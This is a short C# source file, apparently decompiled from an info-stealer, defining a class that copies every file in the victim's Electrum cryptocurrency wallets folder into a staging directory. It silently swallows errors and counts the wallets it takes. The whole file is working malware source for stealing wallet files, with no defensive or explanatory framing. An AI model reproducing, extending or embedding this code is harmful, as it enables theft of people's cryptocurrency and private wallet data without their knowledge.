using System.IO;

namespace exos;

internal class Electrum
{
	public static int count = 0;

	public static string ElectrumDir = "\\Wallets\\Electrum\\";

	public static void EleStr(string directorypath)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Helper.AppData + "\\Electrum\\wallets").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(directorypath + ElectrumDir);
				fileInfo.CopyTo(directorypath + ElectrumDir + fileInfo.Name);
			}
			count++;
			Counting.Wallets++;
		}
		catch
		{
		}
	}
}
